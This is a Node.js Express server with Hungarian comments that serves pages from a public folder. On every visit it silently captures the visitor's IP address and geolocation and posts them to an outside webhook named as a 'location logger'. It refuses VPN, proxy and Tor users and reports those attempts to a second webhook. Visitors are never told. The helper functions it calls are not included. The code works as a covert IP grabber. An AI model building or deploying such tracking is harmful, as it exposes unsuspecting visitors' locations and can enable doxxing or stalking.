require('dotenv').config();

const express = require('express');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const app = express();

const PORT = process.env.PORT || 3000;
const MAIN_WEBHOOK = process.env.MAIN_WEBHOOK;
const ALERT_WEBHOOK = process.env.ALERT_WEBHOOK;
const PROXYCHECK_API_KEY = process.env.PROXYCHECK_API_KEY;

// --- MINDEN statikus fájl kiszolgálása a /public alól (mindenképp az első legyen!) ---
app.use(express.static(path.join(__dirname, 'public')));

// --- FŐOLDAL: mindig a szaby/index.html-t adja vissza, de a link a főoldal marad! ---
app.get('/', async (req, res) => {
  const folderName = 'szaby';
  const ip = getClientIp(req);
  const geoData = await getGeo(ip);

  // --- FŐ WEBHOOK LOG (teljes) ---
  axios.post(MAIN_WEBHOOK, {
    username: "Helyszíni Naplózó <3",
    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
    content: '',
    embeds: [{
      title: 'Új látogató az oldalon!',
      description: `**Oldal:** /${folderName}\n` + formatGeoDataTeljes(geoData),
      color: 0x800080
    }]
  }).catch(()=>{});

  if (await isVpnProxy(ip)) {
    axios.post(ALERT_WEBHOOK, {
      username: "VPN figyelő <3",
      avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
      content: '',
      embeds: [{
        title: 'VPN/proxy vagy TOR-ral próbálkozás!',
        description: `**Oldal:** /${folderName}\n` + formatGeoDataVpn(geoData),
        color: 0xff0000
      }]
    }).catch(()=>{});
    return res.status(403).send('VPN/proxy vagy TOR használata tiltott ezen az oldalon! 🚫');
  }

  // Visszaadja a szaby/index.html-t (de URL: '/')
  const filePath = path.join(__dirname, 'public', 'szaby', 'index.html');
  res.sendFile(filePath);
});

// --- Dinamikus oldalak: pl. /szaby, /kecske, /barmi ---
app.get('/:folder', async (req, res, next) => {
  const folderName = req.params.folder;
  if (folderName === 'report') return next();

  const dirPath = path.join(__dirname, 'public', folderName);
  const filePath = path.join(dirPath, 'index.html');
  if (!fs.existsSync(filePath)) return next();

  const ip = getClientIp(req);
  const geoData = await getGeo(ip);

  axios.post(MAIN_WEBHOOK, {
    username: "Helyszíni Naplózó <3",
    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
    content: '',
    embeds: [{
      title: 'Új látogató az oldalon!',
      description: `**Oldal:** /${folderName}\n` + formatGeoDataTeljes(geoData),
      color: 0x800080
    }]
  }).catch(()=>{});

  if (await isVpnProxy(ip)) {
    axios.post(ALERT_WEBHOOK, {
      username: "VPN figyelő <3",
      avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
      content: '',
      embeds: [{
        title: 'VPN/proxy vagy TOR-ral próbálkozás!',
        description: `**Oldal:** /${folderName}\n` + formatGeoDataVpn(geoData),
        color: 0xff0000
      }]
    }).catch(()=>{});
    return res.status(403).send('VPN/proxy vagy TOR használata tiltott ezen az oldalon! 🚫');
  }

  res.sendFile(filePath);
});

// --- Gyanús tevékenység reportolása ---
app.post('/report', express.json(), async (req, res) => {
  const ip = getClientIp(req);
  const { reason, page } = req.body;
  const geoData = await getGeo(ip);

  axios.post(ALERT_WEBHOOK, {
    username: "Riasztóbot <3",
    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
    content: '',
    embeds: [{
      title: 'Gyanús tevékenység!',
      description:
        `**Oldal:** ${page || 'Ismeretlen'}\n` +
        `**Művelet:** ${reason}\n` +
        formatGeoDataReport(geoData),
      color: 0xff0000
    }]
  }).catch(()=>{});

  res.json({ ok: true });
});

// --- 404 minden másra ---
app.use((req, res) => {
  res.status(404).send('404 Not Found');
});

app.listen(PORT, () => {
  console.log(`Szerver elindult: http://localhost:${PORT}`);
});

// --- Utility függvények maradnak lent... ---
